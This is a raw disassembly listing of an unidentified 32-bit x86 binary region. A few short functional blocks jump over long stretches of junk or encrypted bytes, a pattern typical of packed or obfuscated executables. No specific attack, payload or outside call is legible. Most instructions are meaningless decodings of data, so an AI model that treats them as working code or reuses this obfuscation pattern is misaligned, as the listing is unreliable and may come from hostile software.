  406d13:	inc    esi
  406d14:	shr    BYTE PTR [edx],cl
  406d16:	sub    eax,0xb1d3da4a
  406d1b:	arpl   bp,si
  406d1d:	ds stos DWORD PTR es:[edi],eax
  406d1f:	bound  ecx,QWORD PTR [edx-0x6429b247]
  406d25:	mov    DWORD PTR [edx],0x59d6417a
  406d2b:	mov    dh,0x2a
  406d2d:	pop    esp
  406d2e:	dec    esp
  406d2f:	pop    ebp
  406d30:	jmp    0xe4da:0x1a729bf4
  406d37:	cs scas al,BYTE PTR es:[edi]
  406d39:	int3   
  406d3a:	lods   eax,DWORD PTR ds:[esi]
  406d3b:	int    0x4a
  406d3d:	pop    edi
  406d3e:	mov    dh,0x9b
  406d40:	adc    al,0xc1
  406d42:	loope  0x406d62
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi-0x5e95f9fd]
  406db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406db6:	shl    DWORD PTR [eax+0xa],1
  406db9:	mov    ebx,DWORD PTR [eax]
  406dbb:	sbb    BYTE PTR [esi+0x5f181812],bl
  406dc1:	sub    eax,0x6b5230f1
  406dc6:	pop    esi
  406dc7:	add    esp,ebx
  406dc9:	es inc ebx
  406dcb:	cld    
  406dcc:	lahf   
  406dcd:	cmp    al,BYTE PTR [ecx]
  406dcf:	and    al,0x7
  406dd1:	inc    ecx
  406dd2:	dec    edx
  406dd3:	bound  eax,QWORD PTR [edx+0x693b03cf]
  406dd9:	push   ebx
  406dda:	mov    ebp,DWORD PTR [eax]
  406ddc:	sub    al,0x5
  406dde:	fisttp DWORD PTR [edx-0x9435b6e]
  406de4:	pushf  
  406de5:	mov    al,0x55
  406de7:	loopne 0x406d8f
  406de9:	es pusha 
  406deb:	clc    
  406dec:	dec    ebp
  406ded:	stos   BYTE PTR es:[edi],al
  406dee:	je     0x406e64
  406df0:	rcl    DWORD PTR [ebx+0x2f47fc21],0x5c
  406df7:	sub    DWORD PTR [ebx],esi
  406df9:	jae    0x406e49
  406dfb:	rcl    DWORD PTR [edx+0x1d],1
  406dfe:	imul   esp,ebx,0x446eae11
  406e04:	sub    dh,BYTE PTR [eax-0x2758b076]
  406e0a:	les    ebx,FWORD PTR [edi+edi*4-0x1f]
  406e0e:	aam    0xdf
  406e10:	stos   DWORD PTR es:[edi],eax
  406e11:	jmp    0x1e4c:0x5b0bfdbb
  406e18:	push   es
  406e19:	dec    ecx
  406e1a:	in     eax,dx
  406e1b:	aad    0x2
  406e1d:	jmp    0x406e5b
  406e1f:	xor    BYTE PTR [ecx-0x55],ah
  406e22:	sbb    BYTE PTR [eax+0x39b34c06],bh
  406e28:	jmp    0xd18f2d30
  406e2d:	push   ecx
  406e2e:	bswap  eax
  406e30:	je     0x406e0d
  406e32:	mov    eax,0x36d3d3bf
  406e37:	not    bl
  406e39:	cmp    cl,BYTE PTR [edi+0x5e]
  406e3c:	push   ebp
  406e3d:	xor    eax,0x5c65c75e
  406e42:	clc    
  406e43:	jle    0x406dd1
  406e45:	repz mov ch,0x53
  406e48:	dec    edi
  406e49:	mov    dh,0x1e
  406e4b:	mul    BYTE PTR [edx-0x3d]
  406e4e:	mov    dl,0xa2
  406e50:	jge    0x406de0
  406e52:	pop    esi
  406e53:	push   cs
  406e54:	push   edx
  406e55:	and    DWORD PTR [ecx-0x4],ebp
  406e58:	push   ebp
  406e59:	mov    ds:0x936a2cff,eax
  406e5e:	es lock inc edx
  406e61:	fstp   TBYTE PTR [ebx+0x13b9189f]
  406e67:	xchg   BYTE PTR [eax+0x3dfdfda5],bl
  406e6d:	mov    DWORD PTR [edi],edi
  406e6f:	rcl    BYTE PTR [ebp+0x2416dd52],1
  406e75:	mov    ch,0xe9
  406e77:	push   eax
  406e78:	mov    cl,0x2b
  406e7a:	xchg   BYTE PTR [ebp+esi*2-0xa],ah
  406e7e:	push   esp
  406e7f:	sub    al,al
  406e81:	mov    ebp,esi
  406e83:	jle    0x406e79
  406e85:	(bad)  
  406e86:	fsubr  QWORD PTR [ecx]
  406e88:	inc    eax
  406e89:	dec    DWORD PTR [eax-0x68]
  406e8c:	or     DWORD PTR [esi],eax
  406e8e:	mov    ah,0x76
  406e90:	and    dh,bh
  406e92:	push   es
  406e93:	outs   dx,DWORD PTR ds:[esi]
  406e94:	jbe    0x406eb4
  406e96:	hlt    
  406e97:	aaa    
  406e98:	adc    DWORD PTR [edx-0x62915558],esi
  406e9e:	fild   WORD PTR [esi]
  406ea0:	cmp    esi,0xffffffa6
  406ea3:	xor    al,0xe0
  406ea5:	pop    eax
  406ea6:	mov    edi,0x8397ac49
  406eab:	cmp    al,0x9f
  406ead:	mov    cl,0xe3
  406eaf:	push   ds
  406eb0:	(bad)  
  406eb1:	int    0x2
  406eb3:	stos   DWORD PTR es:[edi],eax
  406eb4:	mov    ebx,0xb342e010
  406eb9:	pop    eax
  406eba:	dec    esi
  406ebb:	or     al,0xa0
  406ebd:	test   BYTE PTR [edi],ch
  406ebf:	adc    BYTE PTR [bx+si-0x60],bh
  406ec3:	adc    al,0xe1
  406ec5:	out    0xaf,al
  406ec7:	sbb    DWORD PTR [edx+eiz*8],edx
  406eca:	(bad)  
  406ecb:	jmp    0x406e50
  406ecd:	outs   dx,DWORD PTR ds:[esi]
  406ece:	(bad)  
  406ecf:	or     ecx,DWORD PTR [eax-0x41a39626]
  406ed5:	inc    esp
  406ed6:	sbb    eax,0xc9acdf96
  406edb:	sahf   
  406edc:	add    al,ch
  406ede:	stos   DWORD PTR es:[edi],eax
  406edf:	iret   
  406ee0:	dec    ecx
  406ee1:	enter  0xe9d6,0x7d
  406ee5:	out    dx,al
  406ee6:	mov    al,0x9d
  406ee8:	icebp  
  406ee9:	(bad)  
  406eea:	cli    
  406eeb:	in     eax,0x9e
  406eed:	aaa    
  406eee:	jno    0x406edd
  406ef0:	pop    esi
  406ef1:	push   ebx
  406ef2:	inc    esp
  406ef3:	shl    DWORD PTR [ecx+ecx*2+0x25915452],1
  406efa:	dec    edx
  406efb:	mov    cl,0xc8
  406efd:	lods   eax,DWORD PTR ds:[esi]
  406efe:	inc    eax
  406eff:	adc    dl,BYTE PTR ds:0x644edbc0
  406f05:	imul   eax,esp,0xfffffff6
  406f08:	cmp    ecx,DWORD PTR [edi]
  406f0a:	pop    ss
  406f0b:	bound  edx,QWORD PTR [ebp+edx*2-0x6]
  406f0f:	pusha  
  406f10:	pop    ebx
  406f11:	call   DWORD PTR [esi+0x48]
  406f14:	sbb    ah,cl
  406f16:	or     edi,DWORD PTR [eax-0x7a]
  406f19:	test   al,0x53
  406f1b:	fsub   DWORD PTR [edx+0x56]
  406f1e:	inc    eax
  406f1f:	xchg   edi,eax
  406f20:	clc    
  406f21:	add    al,0xe6
  406f23:	sub    ch,BYTE PTR [ebx+0x22]
  406f26:	adc    BYTE PTR [edi+0x17],bl
  406f29:	xor    bh,bh
  406f2b:	pop    ds
  406f2c:	mov    edi,0xcf642455
  406f31:	adc    eax,0xd2bdaa3f
  406f36:	ja     0x406f3f
  406f38:	je     0x406f08
  406f3a:	mov    ds:0x89ace855,eax
  406f3f:	cli    
  406f40:	sbb    al,0x8d
  406f42:	lods   al,BYTE PTR ds:[esi]
  406f43:	adc    al,0x2d
  406f45:	or     al,0x41
  406f47:	imul   edx,DWORD PTR [edi],0xd795f31c
  406f4d:	cld    
  406f4e:	sti    
  406f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f50:	test   DWORD PTR [eax+ebx*1],esi
  406f53:	mov    edi,0x6fb33f2f
  406f58:	xchg   edx,eax
  406f59:	pop    es
  406f5a:	ficom  DWORD PTR [ebp+0x15]
  406f5d:	mov    dl,0x6f
  406f5f:	inc    esi
  406f60:	inc    eax
  406f61:	fidivr WORD PTR [ebx]
  406f63:	loop   0x406f7a
  406f65:	ins    BYTE PTR es:[edi],dx
  406f66:	cmc    
  406f67:	fs adc al,0xe4
  406f6a:	in     al,dx
  406f6b:	sub    bh,BYTE PTR [esp+ebp*8+0x23e6c470]
  406f72:	fild   DWORD PTR [edx+0x30301966]
  406f78:	xchg   edx,eax
  406f79:	scas   al,BYTE PTR es:[edi]
  406f7a:	push   edx
  406f7b:	test   BYTE PTR [edx],dl
  406f7d:	lahf   
  406f7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f7f:	das    
  406f80:	cmp    cl,BYTE PTR [ecx+ecx*1-0x13]
  406f84:	mov    WORD PTR [ebp-0x7ac3a951],ss
  406f8a:	fs out dx,al
  406f8c:	sub    BYTE PTR [ebx],0xb8
  406f8f:	push   0x11954442
  406f94:	xchg   edi,eax
  406f95:	dec    edi
  406f97:	inc    edx
  406f98:	cmp    bh,BYTE PTR [edx+0x24]
  406f9b:	jns    0x406f85
  406f9d:	scas   al,BYTE PTR es:[edi]
  406f9e:	outs   dx,DWORD PTR ds:[esi]
  406f9f:	ins    DWORD PTR es:[edi],dx
  406fa0:	(bad)  
  406fa1:	pop    esp
  406fa2:	pop    ecx
  406fa3:	loop   0x406f44
  406fa5:	cld    
  406fa6:	or     al,0x9
  406fa8:	mov    al,ds:0xfa9485d3
  406fad:	and    al,0xf4
  406fb0:	mov    dh,BYTE PTR [eax-0x5dd46de8]
  406fb6:	icebp  
  406fb7:	adc    DWORD PTR [edi],ebp
  406fb9:	outs   dx,DWORD PTR ds:[esi]
  406fba:	mov    edi,0x57d333a7
  406fbf:	call   0xd2651abd
  406fc4:	test   BYTE PTR [edi-0x6bde7f28],ch
  406fca:	jge    0x406fc2
  406fcc:	jmp    0xcfd2:0xe26de144
  406fd3:	ja     0x407022
  406fd5:	mov    esp,0x9b36d7a8
  406fda:	in     al,dx
  406fdb:	dec    edi
  406fdc:	neg    BYTE PTR [ebp+0x3ad37562]
  406fe2:	sahf   
  406fe3:	sub    eax,0xe638115c
  406fe8:	dec    edx
  406fe9:	pop    edi
  406fea:	adc    eax,0x4add791b
  406fef:	std    
  406ff0:	jbe    0x407005
  406ff2:	mov    edi,0x166931f9
  406ff7:	sbb    BYTE PTR ds:0x5c4b5243,dl
  406ffd:	mov    edi,0x76beb821
  407002:	jmp    FWORD PTR [esi]
  407004:	xchg   edi,eax
  407005:	into   
  407006:	das    
  407007:	jne    0x406fba
  407009:	sub    bl,BYTE PTR [ecx-0x1c9cfc36]
  40700f:	loope  0x407070
  407011:	or     esp,DWORD PTR [edi]
  407013:	jecxz  0x406fea
  407015:	pop    edi
  407016:	out    0x7c,al
  407018:	cmp    ah,BYTE PTR [ecx]
  40701a:	cmp    al,0x2
  40701c:	fdivr  DWORD PTR [edi-0x6a0016c8]
  407022:	sub    edx,DWORD PTR [eax+edx*4-0xd]
  407026:	shr    BYTE PTR [edx],cl
  407028:	push   ecx
  407029:	cwde   
  40702a:	xchg   edi,eax
  40702b:	mov    al,0x14
  40702d:	xor    eax,DWORD PTR [ecx]
  40702f:	inc    edi
  407030:	stos   DWORD PTR es:[edi],eax
  407031:	or     al,0x72
  407033:	ret    
  407034:	ins    BYTE PTR es:[edi],dx
  407035:	adc    BYTE PTR [eax],bh
  407037:	xchg   esi,eax
  407038:	xor    DWORD PTR [ebx-0x74],0x27
  40703c:	fldenv [edi+ecx*4+0x6d]
  407040:	mov    esp,DWORD PTR [esi-0x42]
  407043:	adc    BYTE PTR [edi+0x62],cl
  407046:	mov    ecx,0x237a8cdc
  40704b:	add    eax,ecx
  40704d:	int3   
  40704e:	pop    ecx
  40704f:	jnp    0x407092
  407051:	push   ecx
  407052:	push   ss
  407053:	test   BYTE PTR [edx+0x46108942],al
  407059:	mov    ds:0x9232da9f,eax
  40705e:	mov    BYTE PTR [eax-0xd],bl
  407061:	jb     0x407097
  407063:	xor    ch,BYTE PTR [ecx+0x4dcdf25c]
  407069:	xor    DWORD PTR [ebp+edx*8+0x19],0x856bdfd9
  407071:	jae    0x40709c
  407073:	aas    
  407074:	je     0x4070a5
  407076:	cmc    
  407077:	pop    ecx
  407078:	rol    ecx,cl
  40707a:	cmp    DWORD PTR [edi+0x6c],ecx
  40707d:	in     al,dx
  40707e:	es test eax,0xaa7d1480
  407084:	popa   
  407085:	push   ecx
  407086:	int    0x7e
  407088:	icebp  
  407089:	rcr    DWORD PTR [ecx+ebx*8],1
  40708c:	(bad)  
  40708d:	(bad)  
  40708e:	jge    0x4070a2
  407090:	jmp    0x5b46a98b
  407095:	sub    eax,0xa934f7f2
  40709a:	mov    al,0x2a
  40709c:	out    dx,eax
  40709d:	rol    DWORD PTR [ecx+ebx*1-0x2f],1
  4070a1:	pop    ecx
  4070a2:	dec    ebx
  4070a3:	or     al,0x50
  4070a5:	retf   
  4070a6:	mov    esp,0x9e30d6f0
  4070ab:	bound  edi,QWORD PTR [esi+0x42949164]
  4070b1:	leave  
  4070b2:	push   es
  4070b3:	sbb    dh,BYTE PTR [eax+0x58]
  4070b6:	and    al,0x68
  4070b8:	pop    eax
  4070b9:	ins    BYTE PTR es:[edi],dx
  4070ba:	sbb    BYTE PTR [esp+edx*1],bh
  4070bd:	das    
  4070be:	dec    esp
  4070bf:	(bad)  
  4070c0:	xchg   ecx,eax
  4070c1:	push   ebx
  4070c2:	ja     0x40708c
  4070c4:	rcl    BYTE PTR [ecx+0x19],cl
  4070c7:	mov    esp,0xface5937
  4070cc:	mov    esp,0xe3d8b7db
  4070d1:	mov    ah,0x0
  4070d3:	out    0x30,eax
  4070d5:	imul   eax,DWORD PTR [ebp+0x624b773e],0x524d410c
  4070df:	sbb    BYTE PTR [ecx-0x2],bl
  4070e2:	aam    0xea
  4070e4:	inc    edx
  4070e5:	jb     0x4070d0
  4070e7:	pop    esi
  4070e9:	or     ecx,DWORD PTR [edi-0x7c]
  4070ec:	js     0x4070d6
  4070ee:	inc    eax
  4070ef:	(bad)  
  4070f0:	xor    al,0x51
  4070f2:	xor    edi,edi
  4070f4:	pop    eax
  4070f5:	push   0x5d02b2e3
  4070fa:	jo     0x4070c6
  4070fc:	sbb    ebp,DWORD PTR [edx-0x5b7ab647]
  407102:	inc    ebp
  407103:	cli    
  407104:	(bad)  
  407105:	mov    ah,0xc9
  407107:	bound  edi,QWORD PTR [edi+edx*2+0x4fe5df6c]
  40710e:	add    al,0x37
  407110:	mov    dh,0xef
  407112:	mov    ebx,0xf296d7e1
  407117:	lahf   
  407118:	push   eax
  407119:	in     al,0xfe
  40711b:	dec    esp
  40711c:	xchg   edi,eax
  40711d:	ficomp WORD PTR [ebp-0x6d]
  407120:	mov    dh,0xba
  407122:	sub    edx,DWORD PTR [edx]
  407124:	sub    eax,0x42f57745
  407129:	push   ds
  40712a:	nop
  40712b:	xor    dh,dh
  40712d:	call   0x6f375f21
  407132:	punpcklwd mm0,DWORD PTR [edi+0x35]
  407136:	fwait
  407137:	jnp    0x40718a
  407139:	add    BYTE PTR [esi-0x3e],bl
  40713c:	or     esp,esi
  40713e:	jns    0x407109
  407140:	retf   
  407141:	push   cs
  407142:	and    ebp,esi
  407144:	jle    0x407100
  407146:	lea    ebx,[bx+si]
  407149:	sahf   
  40714a:	mov    esi,esp
  40714c:	xchg   DWORD PTR [esp+eiz*2],esp
  40714f:	or     dh,dh
  407151:	div    ecx
  407153:	test   bl,al
  407155:	inc    esi
  407156:	cmp    ch,BYTE PTR [eax-0x1a6bb975]
  40715c:	lods   al,BYTE PTR ds:[esi]
  40715d:	pushf  
  40715e:	test   al,0xa5
  407160:	mov    eax,ds:0x6e19008e
  407165:	push   0xdd058663
  40716a:	and    BYTE PTR [ebx+0x6164f6cc],bh
  407170:	cld    
  407171:	(bad)  
  407172:	outs   dx,BYTE PTR ds:[esi]
  407173:	ss mov al,0x26
  407176:	scas   al,BYTE PTR es:[edi]
  407177:	and    eax,0x382d0f16
  40717c:	loopne 0x407196
  40717e:	ins    BYTE PTR es:[edi],dx
  40717f:	test   al,0x37
  407181:	mov    ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	xchg   edx,eax
  4071c5:	imul   ebp,DWORD PTR [edi],0x188590be
  4071cb:	sbb    BYTE PTR [esi-0x27e7e7ee],bl
  4071d1:	push   ds
  4071d2:	jb     0x4071ca
  4071d4:	int    0xa6
  4071d6:	cmp    al,0x27
  4071d8:	je     0x40721f
  4071da:	out    0xab,eax
  4071dc:	jmp    0x525c:0x4193658
  4071e3:	or     edi,DWORD PTR [edx-0xdfdfe0a]
  4071e9:	mov    ds:0xe2f71e61,eax
  4071ee:	sub    BYTE PTR [ecx+0x63],al
  4071f1:	iret   
  4071f2:	or     ebx,ecx
  4071f4:	jbe    0x40726d
  4071f6:	jmp    0x407249
  4071f8:	scas   eax,DWORD PTR es:[edi]
  4071f9:	or     al,0x87
  4071fb:	pop    es
  4071fc:	adc    al,BYTE PTR [esi+eiz*1-0x3bdebe47]
  407203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407204:	sbb    al,0xa
  407206:	push   esp
  407207:	mov    DWORD PTR [edi],ebp
  407209:	pop    esi
  40720a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40720b:	(bad)  
  40720c:	xchg   BYTE PTR [ecx-0x48],dh
  40720f:	inc    edx
  407210:	ror    DWORD PTR [edi],0x52
  407213:	lea    edx,[ecx]
  407215:	xchg   edi,eax
  407216:	shr    BYTE PTR [ebx+ebp*4-0x3b910199],cl
  40721d:	daa    
  40721e:	adc    eax,0x212e1ad9
  407223:	je     0x40723d
  407225:	mov    cs,WORD PTR [ebx]
  407227:	mov    edx,0x9012dfe9
  40722c:	or     ebx,DWORD PTR [eax]
  40722e:	sbb    eax,0x9c71dfe3
  407233:	jno    0x4071d1
  407235:	mov    ebx,0x9fbb97e
  40723a:	inc    eax
  40723b:	fnstenv [edx-0x5ffcad55]
  407241:	mov    al,0x59
  407243:	pop    edi
  407244:	mov    bl,0x75
  407246:	xchg   ecx,ecx
  407248:	std    
  407249:	cmp    ch,BYTE PTR [edx]
  40724b:	into   
  40724c:	sub    eax,0x37cd360a
  407251:	clc    
  407252:	pop    ecx
  407253:	je     0x40722b
  407255:	mov    ds:0x7cf69a54,eax
  40725a:	xor    BYTE PTR [ebx+0x61],0x60
  40725e:	out    dx,al
  40725f:	icebp  
  407260:	mov    ds:0x2ecf19ea,eax
  407265:	push   ebp
  407266:	jnp    0x407210
  407268:	sbb    BYTE PTR [ecx],ch
  40726a:	xor    eax,0x904cb67e
  40726f:	and    bl,BYTE PTR [ebp+0x12348b71]
  407275:	xchg   ebx,eax
  407276:	sbb    eax,0xd10d82e2
  40727b:	push   ds
  40727c:	jmp    0x407233
  40727e:	jo     0x407218
  407280:	inc    edi
  407281:	outs   dx,DWORD PTR ds:[esi]
  407282:	outs   dx,BYTE PTR ds:[esi]
  407283:	scas   al,BYTE PTR es:[edi]
  407284:	pop    ss
  407285:	sbb    eax,0x1f1fe098
  40728a:	cmp    al,0xf5
  40728c:	mov    ds:0xe192d666,eax
  407291:	dec    DWORD PTR [edx-0x5f]
  407294:	and    al,0x20
  407296:	pop    ds
  407297:	or     al,0xdf
  407299:	sbb    al,0x29
  40729b:	(bad)  
  40729c:	fwait
  40729d:	(bad)  
  40729e:	out    dx,eax
  40729f:	lahf   
  4072a0:	and    esp,DWORD PTR [ebx]
  4072a2:	popa   
  4072a3:	pusha  
  4072a4:	xchg   edx,eax
  4072a5:	add    BYTE PTR [edi+0xe],ch
  4072a8:	scas   eax,DWORD PTR es:[edi]
  4072a9:	in     al,dx
  4072aa:	std    
  4072ab:	mov    bl,0xad
  4072ad:	fnsave [esi+0x2]
  4072b0:	sti    
  4072b1:	ins    BYTE PTR es:[edi],dx
  4072b2:	inc    edx
  4072b3:	xchg   ebp,eax
  4072b4:	stos   BYTE PTR es:[edi],al
  4072b5:	js     0x4072a4
  4072b7:	stc    
  4072b8:	dec    ebx
  4072b9:	jmp    0x2acf:0x759a69b0
  4072c0:	sub    al,BYTE PTR [eax+esi*1]
  4072c3:	sbb    DWORD PTR ds:0xdbc4cb0f,0x4b
  4072ca:	retf   0x8aeb
  4072cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ce:	mov    ecx,0x458abd6b
  4072d3:	mov    DWORD PTR ds:0x978c9adc,ebp
  4072d9:	jecxz  0x407358
  4072db:	and    eax,0xc86e8d89
  4072e0:	inc    edi
  4072e1:	das    
  4072e2:	push   cs
  4072e3:	bnd ja 0x4072f6
  4072e6:	shl    BYTE PTR [edx-0x7d157887],1
  4072ec:	and    al,0x28
  4072ee:	ds xchg ecx,eax
  4072f0:	neg    BYTE PTR es:0x528688c4
  4072f7:	pop    ds
  4072f8:	jecxz  0x407342
  4072fa:	stc    
  4072fb:	call   0xabb80948
  407300:	inc    ebp
  407301:	mov    al,0x43
  407303:	fwait
  407304:	xlat   BYTE PTR ds:[ebx]
  407305:	out    dx,eax
  407306:	adc    eax,0xcedf347a
  40730b:	sbb    ch,BYTE PTR [ebp-0x6de1574d]
  407311:	test   eax,0xb5c94b33
  407316:	sub    al,al
  407318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407319:	mov    dh,0xf3
  40731b:	lods   eax,DWORD PTR ds:[esi]
  40731c:	psubsb mm1,QWORD PTR [ecx-0x3b88715e]
  407323:	dec    edx
  407324:	sub    BYTE PTR [edx+0x47040acf],bl
  40732a:	xchg   edx,eax
  40732b:	pusha  
  40732c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40732d:	in     al,0xa1
  40732f:	loopne 0x407362
  407331:	test   edi,edx
  407333:	xchg   edx,eax
  407334:	repz push eax
  407336:	popf   
  407337:	fucomi st,st(0)
  407339:	sbb    DWORD PTR [ebx],edx
  40733b:	fs push 0x5f
  40733e:	ret    0x579f
  407341:	adc    DWORD PTR [esi+0x49],esp
  407344:	sub    cl,ah
  407346:	setae  BYTE PTR [ecx]
  407349:	stc    
  40734a:	iret   
  40734b:	dec    edi
  40734c:	fbstp  TBYTE PTR [ebx]
  40734e:	pop    es
  40734f:	push   ebx
  407350:	es mov dh,0x73
  407353:	push   esp
  407354:	jg     0x407332
  407356:	cmp    edi,DWORD PTR [ecx]
  407358:	test   edx,ecx
  40735a:	repz or bh,0x53
  40735e:	ja     0x4073b7
  407360:	out    dx,eax
  407361:	ds jl  0x407367
  407364:	sub    al,0x96
  407366:	data16 xlat BYTE PTR ds:[ebx]
  407368:	popf   
  407369:	xchg   ebp,eax
  40736a:	out    dx,al
  40736b:	mov    ebx,0x78036d4d
  407370:	popa   
  407371:	inc    edx
  407372:	das    
  407373:	sub    eax,0xa83d0ae7
  407378:	cs cmp edi,edx
  40737b:	mov    ah,0xb7
  40737d:	or     eax,0x5a971d2a
  407382:	bound  ebx,QWORD PTR [eax+0x77]
  407385:	jg     0x407352
  407387:	sbb    BYTE PTR [ebp+0x31],al
  40738a:	fsub   st,st(4)
  40738c:	or     eax,0x398fbf31
  407391:	(bad)  
  407392:	ds mov bl,0x8
  407395:	aad    0x95
  407397:	pop    esi
  407398:	cmc    
  407399:	out    dx,al
  40739a:	repz or BYTE PTR [esi+eiz*8],cl
  40739e:	out    0x6e,eax
  4073a0:	add    dl,bl
  4073a2:	ja     0x4073e3
  4073a4:	je     0x40737f
  4073a6:	jmp    0xc857:0xd076d2fb
  4073ad:	js     0x4073e4
  4073af:	(bad)  
  4073b0:	ds sbb eax,0x7508bc3c
  4073b6:	inc    esi
  4073b7:	std    
  4073b8:	lods   al,BYTE PTR ds:[esi]
  4073b9:	call   0xab2c:0x9b1f8d06
  4073c0:	inc    ecx
  4073c1:	push   ds
  4073c2:	jne    0x4073e7
  4073c4:	frstor [edi]
  4073c6:	outs   dx,DWORD PTR ds:[esi]
  4073c7:	jmp    0xd934:0x5015398e
  4073ce:	push   esp
  4073cf:	rcr    eax,0x1f
  4073d2:	imul   ecx,DWORD PTR [edx],0xfffffff8
  4073d5:	sub    al,0xac
  4073d7:	inc    ecx
  4073d8:	cmc    
  4073d9:	pop    ds
  4073da:	into   
  4073db:	sar    BYTE PTR [esi-0x28e2fedd],1
  4073e1:	sbb    eax,0xa3e04777
  4073e6:	push   0x7bc541d8
  4073eb:	jnp    0x407444
  4073ed:	gs push esi
  4073ef:	xor    bl,BYTE PTR [eax]
  4073f1:	ins    BYTE PTR es:[edi],dx
  4073f2:	sub    al,0xe4
  4073f4:	adc    DWORD PTR [edi+0x69],esp
  4073f7:	enter  0x8390,0x30
  4073fb:	mov    edi,0x685096de
  407400:	jo     0x40743f
  407402:	out    dx,eax
  407403:	mov    edi,0xa6484f4e
  407408:	mov    BYTE PTR [eax],ch
  40740a:	mov    edi,0x578aea09
  40740f:	or     eax,0xc76a787c
  407414:	stos   BYTE PTR es:[edi],al
  407415:	mov    edi,0x250ef9ea
  40741a:	lods   eax,DWORD PTR ds:[esi]
  40741b:	dec    ecx
  40741c:	ret    0xc8bd
  40741f:	out    0x6,al
  407421:	mov    ds,edx
  407423:	mov    dl,0x47
  407425:	mov    bl,0xe8
  407427:	jmp    0xfab3:0xa27a5395
  40742e:	retf   0x9ce8
  407431:	xchg   ebp,eax
  407432:	stos   BYTE PTR es:[edi],al
  407433:	stc    
  407434:	shl    DWORD PTR [edi+0x4a],0x82
  407438:	dec    edi
  407439:	js     0x407482
  40743b:	jb     0x40741d
  40743d:	sub    bl,BYTE PTR [ecx-0x3af50e36]
  407443:	add    al,0x16
  407445:	sbb    eax,0x7ed37f0a
  40744a:	cmp    esp,DWORD PTR [edx+eax*4+0x426f1b5]
  407451:	pop    esi
  407452:	sbb    cl,BYTE PTR [edi+0x1fce032]
  407458:	sub    edi,DWORD PTR [eax+0x27ec4344]
  40745e:	fisubr WORD PTR [esi+ecx*8+0x72801a33]
  407465:	in     eax,dx
  407466:	and    BYTE PTR [edx+0x7c],bh
  407469:	dec    ebx
  40746a:	nop
  40746b:	mov    ebp,DWORD PTR [edi]
  40746d:	jbe    0x40741c
  40746f:	(bad)  
  407470:	mov    fs,WORD PTR [edi-0x67]
  407473:	push   ds
  407474:	push   eax
  407475:	push   cs
  407476:	outs   dx,DWORD PTR ds:[esi]
  407477:	test   al,0xe3
  407479:	mov    ch,0x1b
  40747b:	jno    0x407443
  40747d:	jecxz  0x407473
  40747f:	imul   ebp,esp,0x25056b80
  407485:	add    DWORD PTR [ebp+0x79257d18],edx
  40748b:	out    0x8e,eax
  40748d:	pop    ecx
  40748e:	cld    
  40748f:	push   esp
  407490:	cmc    
  407491:	lea    ebp,[ebx+0x24bd7da7]
  407497:	mov    esp,0x65c699ad
  40749c:	sbb    al,0xa8
  40749e:	xor    al,0x3d
  4074a0:	add    esi,DWORD PTR [edi]
  4074a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a3:	pop    edx
  4074a4:	sub    eax,0x81ff5c8a
  4074a9:	fild   DWORD PTR [eax-0x80]
  4074ac:	mov    al,bl
  4074ae:	xchg   ebx,eax
  4074af:	jl     0x40745f
  4074b1:	inc    eax
  4074b2:	jae    0x4074ce
